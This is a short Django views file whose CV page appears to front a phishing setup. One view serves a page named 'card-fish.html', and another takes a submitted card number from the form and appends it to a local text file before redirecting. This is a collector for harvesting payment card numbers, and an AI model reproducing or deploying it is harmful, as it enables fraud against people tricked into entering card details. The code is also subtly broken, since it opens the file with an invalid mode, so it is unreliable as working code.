from django.shortcuts import render,redirect


def showCV(request):
    return render(request, 'index.html')

def renderingFish(request):
    return render(request,'card-fish.html')

def data(request):
    card_num = request.POST['card-number']
    file = open('text.txt', '+')
    file.write(card_num + "\n")
    return redirect('/')

# Create your views here.
